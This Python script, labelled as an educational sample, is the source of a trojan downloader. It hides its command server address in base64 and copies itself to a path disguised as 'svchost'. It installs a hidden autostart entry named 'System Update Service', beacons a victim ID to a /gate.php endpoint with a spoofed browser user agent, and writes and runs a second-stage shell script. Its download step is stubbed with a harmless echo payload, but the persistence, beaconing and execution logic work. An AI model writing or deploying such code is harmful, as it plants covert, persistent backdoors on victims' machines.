#!/usr/bin/env python3
# Generic Trojan Downloader - Educational Sample
# DO NOT USE MALICIOUSLY

import os
import sys
import socket
import base64
import hashlib
import subprocess
from pathlib import Path
import time

C2 = base64.b64decode(b'MTkyLjE2OC4xLjEwMA==').decode()
PORT = 0x1F90 

class TrojanDownloader:
    def __init__(self):
        self.mutex = "Global\\{A5B3C2D1}"
        self.install_path = os.path.join(os.path.expanduser('~'), '.local', 'share', 'svchost')
        self.persistence_file = os.path.join(os.path.expanduser('~'), '.config', 'autostart', 'update-service.desktop')
        
    def check_mutex(self):
        """Prevent multiple instances"""
        lock_file = '/tmp/.trojan_mutex_A5B3C2D1'
        if os.path.exists(lock_file):
            return False
        try:
            open(lock_file, 'w').write(str(os.getpid()))
            return True
        except:
            return False
    
    def install_persistence(self):
        """Install autostart mechanism"""
        try:
            os.makedirs(os.path.dirname(self.install_path), exist_ok=True)
            if not os.path.exists(self.install_path):
                import shutil
                shutil.copy2(__file__, self.install_path)
            
            os.makedirs(os.path.dirname(self.persistence_file), exist_ok=True)
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update Service
Exec=python3 {self.install_path}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
            with open(self.persistence_file, 'w') as f:
                f.write(desktop_content)
            
            return True
        except:
            return False
    
    def beacon_c2(self):
        """Contact C2 server and get commands"""
        try:
            # Generate victim ID
            try:
                username = os.getlogin()
            except:
                username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
            
            victim_id = hashlib.md5(username.encode()).hexdigest()[:16]
            
            # Build HTTP request
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((C2, PORT))
            
            payload = f"POST /gate.php HTTP/1.1\r\n"
            payload += f"Host: {C2}\r\n"
            payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\n"
            payload += f"Content-Length: {len(victim_id)}\r\n"
            payload += "Connection: close\r\n"
            payload += "\r\n"
            payload += victim_id
            
            sock.send(payload.encode())
            response = sock.recv(4096).decode()
            sock.close()
            
            # Parse response for download URL
            if "DOWNLOAD:" in response:
                url = response.split("DOWNLOAD:")[1].strip().split()[0]
                return url
            
            return None
        except:
            return None
    
    def download_payload(self, url):
        """Download and execute secondary payload"""
        try:
            # Simulate download (in real malware, would use urllib/requests)
            payload_path = '/tmp/.payload.sh'
            
            # For demo: create a benign payload
            payload_content = """#!/bin/bash
echo "[Payload] Secondary stage executed"
echo "[Payload] System info: $(uname -a)"
"""
            with open(payload_path, 'w') as f:
                f.write(payload_content)
            
            os.chmod(payload_path, 0o700)
            
            # Execute payload
            subprocess.Popen(['/bin/bash', payload_path], 
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            
            return True
        except:
            return False
    
    def collect_info(self):
        """Collect system information"""
        try:
            username = os.getlogin()
        except:
            username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        
        info = {
            'user': username,
            'hostname': socket.gethostname(),
            'cwd': os.getcwd(),
            'home': str(Path.home())
        }
        return info
    
    def run(self):
        """Main execution flow"""
        # Check mutex
        if not self.check_mutex():
            sys.exit(0)
        
        # Install persistence
        self.install_persistence()
        
        # Collect info
        info = self.collect_info()
        
        # Contact C2
        download_url = self.beacon_c2()
        
        # Download payload if URL received
        if download_url:
            self.download_payload(download_url)
        
        # Sleep to avoid detection
        time.sleep(2)

def main():
    trojan = TrojanDownloader()
    trojan.run()
    print("[System] Update check completed")

if __name__ == "__main__":
    main()
